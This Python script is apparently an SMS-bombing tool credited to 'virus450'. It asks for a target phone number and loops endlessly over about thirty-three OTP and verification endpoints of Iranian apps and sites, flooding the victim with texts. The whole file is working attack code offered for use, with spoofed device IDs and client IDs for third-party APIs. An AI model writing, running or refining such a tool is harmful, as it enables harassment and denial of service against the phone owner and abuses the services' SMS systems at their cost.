##################
# Manufacturer:virus450#
#                    jsm                  #
#               telegram:            #
#    https://t.me/virus450#
##################
import requests 
import time , os 
from colorama import Fore
class color:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    END = '\033[0m'

#-----------------
os.system("clear" or "cls")
print(color.RED+"Updating"+ color.END,color.GREEN +"pip"+ color.END , color.BLUE +"Wait"+ color.END ,)
time.sleep(2)
os.system("clear" or "cls")
#Updating
os.system("pip install requests")
os.system("clear" or "cls")
os_type = os.name
def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        time.sleep(0.1)
    print()
SlowPrint(color.GREEN+"■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
SlowPrint("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
SlowPrint("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" + color.END)
SlowPrint("□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□")
SlowPrint("□□□□□□□□□□□□(‌ONE 1 HACK)□□□□□□□□□□□□□")
SlowPrint("□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□")
SlowPrint(color.RED+"■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
SlowPrint("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
SlowPrint("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" + color.END)
print("")
print(color.BLUE + "[" + color.GREEN + "~" +   color.BLUE + "]" +color.RED + "For " + color.GREEN + "example"+ color.BLUE +" : " + color.YELLOW + "0994******* ")
print("")
print(color.RED + "~~~~~" + color.YELLOW+ "~~~~~" + color.GREEN + "~~~~~" + color.BLUE + "~~~~~")
number = input( color.BLUE + "["+ color.GREEN + "~" + color.BLUE + "]" +color.GREEN + "target" + "‌‌ "+ color.BLUE + "number" + color.RED+ ": " +color.END)
os.system("clear")
#snap
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
num = {"cellphone":number}
#bazar
url1 = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
num1 ={"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":number}}}
#ail baba
url2 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
num2 = {"phoneNumber":number}
#dr
url3 = "https://drdr.ir/api/registerEnrollment/verifyMobile"
num3 = {"phoneNumber":number,"userType":"PATIENT"}
#gapfilme
url4 ="https://core.gapfilm.ir/api/v3.1/Account/Login"
num4 = {"Type":3,"Username":number}
#tebinja
url5 = "https://api.torob.com/a/phone/send-pin/?phone_number=" + number
#spard
url6 = "https://app.espard.com/api/v1/auth/identify-by-mobile"
num5 = {"data":{"mobile":number},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"}
#snap link
url7 = "https://api.snapp.ir/api/v1/sms/link"
num7 = {"phone":number}
#tap30
url8 = "https://api.tapsi.cab/api/v2/user"
num8 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
#namava
url9 = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
num9 = {"UserName":number}
#jabama
url10 = "https://taraazws.jabama.com/api/v4/account/send-code"
num10 = {"mobile":number}
#mobile-paz
url11 = "https://api.pezeshket.com/core/v1/auth/requestCode"
num11 = {"mobileNumber":number}
#basalam
url12 = "https://api.basalam.com/user"

num12 = {"variables":{"mobile":number},"query":"mutation checkMobileExistence($mobile: MobileScalar!) { checkMobileExistence(mobile: $mobile) }"}
#anten
url13 = "https://api2.anten.ir/users"
num13 = {"phone":number}
#espard 
url14 = "https://app.espard.com/api/v1/auth/identify-by-mobile"

num14 = {"data":{"mobile":number},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1631036680874"}
#ezki
url15 = "https://www.azki.com/prod/api/api/customer/register/check-phone-number?phoneNumber=" + number
#gap
url16 = "https://core.gap.im/v1/user/add.json?mobile=" + number
#snap market
url17 = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + number
#payam resan
url18 = "https://www.payam-resan.com/PublicPage/CMSAjax.ashx?&type=SendSampleSMS&mobile=" + number
#a4baz
url19 = "https://a4baz.com/api/web/login"

num19 = {"cellphone":number}
#tamland
url20 = "https://1401api.tamland.ir/api/user/signup"

num20 = {"Mobile":number,"SchoolId":-1}
#shad
url21 = "https://shadmessenger55.iranlms.ir/"
num21 = {"api_version":3,"method":"sendCode","data":{"send_type":"SMS","phone_number":number}}
#torob
url22 =  "https://api.torob.com/a/phone/send-pin/?phone_number=" + number
#divar
url23 = "https://api.divar.ir/v5/auth/authenticate"
num23 = {"phone":number} 
#doctoreto
url24 = "https://doctoreto.com/web/api/v2/auth/code"
num24 = {"mobile":number}
#snap.doctor
url25 = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"+number+"/sms?cCode="
#emtiyaz
url26 = "https://web.emtiyaz.app/login"
num26 = {"cellphone":number}
#tebinja
url27 = "https://www.tebinja.com/api/v1/users"
num27 = {"username":number,"captchaHash":"","captchaValue":""}
#snapptrip
url28 = "https://www.snapptrip.com/register"
num28 = {"lang":"fa","country_id":"860","password":"virus450"}
#rubika
url29 =  "https://messengerg2c4.iranlms.ir"
num29 = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
#baslam
url30 =  "https://api.basalam.com/user"
num30= {"variables":{"mobile":number},"query":"mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}
#pikato
url31 = "http://api.pikato.net/Users/Mobile-Login"
num31 = {"mobile":number}
#wishato
url32 = "https://wishato.com/api/users/join/signup"
num32 = {"cellphone":number}
#sehypoor
url33 = "https://www.sheypoor.com/api/v10.0.0/auth/send"
num33 = {"username":number}
while True:
	m = requests.post(url, json=num)
	if m.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	m1 = requests.post(url1 ,json=num1)
	if m1.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	m2 = requests.post(url2 ,json=num2)
	if m2.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m3 = requests.post(url3 ,json=num3)
	if m3.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m4 = requests.post(url4 ,json=num4)
	if m4.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.end)
	time.sleep(0.5)
	m5 = requests.get(url5)
	if m5.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)		 
	m6 = requests.post(url6 ,json=num5)
	if m6.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m7 = requests.post(url7 ,json=num7)
	if m7.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m8 = requests.post(url8 ,json=num8)
	if m8.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.8)
	m9 = requests.post(url9 ,json=num9)
	if m9.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m10 = requests.post(url10 ,json=num10)
	if m10.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m11 = requests.post(url11 ,json=num11)
	if m11.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.3)
	m12 = requests.post(url12 ,json=num12)
	if m12.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	m13 = requests.post(url13 ,json=num13)
	if m13.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.7)
	m14 = requests.post(url14 ,json=num)
	if m14.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m15 = requests.post(url15)
	if m15.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m16 = requests.post(url16)
	if m16.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.5)
	m17 = requests.post(url17)
	if m17.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m18 = requests.post(url18)
	if m18.status_code == 200:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m19 = requests.post(url19 ,json=num19)
	if m19.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.3)
	m20 = requests.post(url20 ,json=num20)
	if m20.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.6)
	m21 = requests.post(url21 ,json=num21)
	if m21.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m22 = requests.get(url22)
	if m22.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.6)
	m23 = requests.post(url23 ,json=num23)
	if m23.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m24 = requests.post(url24 ,json=num24)
	if m24.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m25 = requests.get(url25)
	if m25.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.2)
	m26 = requests.post(url26 ,json=num26)
	if m26.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m27 = requests.post(url27 ,json=num27)
	if m27.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m28 = requests.post(url28 ,json=num28)
	if m28.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	time.sleep(0.4)
	m29 = requests.post(url29 ,json=num29)
	if m29.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	m30 = requests.post(url30 ,json=num30)
	if m30.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
		m31 = requests.post(url31 ,json=num31)
	if m31.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
	m32 = requests.post(url32 ,json=num32)
	if m32.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
		m33 = requests.post(url33 ,json=num33)
	if m33.status_code == 200:
		print(color.BLUE +"["+ color.YELLOW+"~"+color.BLUE+"]"+color.GREEN +"SEND SMS [✓] " +color.END)
	else:
		print(color.BLUE+"["+color.YELLOW+"~"+color.BLUE +"]"+color.RED +"ERROR [☓]"+ color.END)
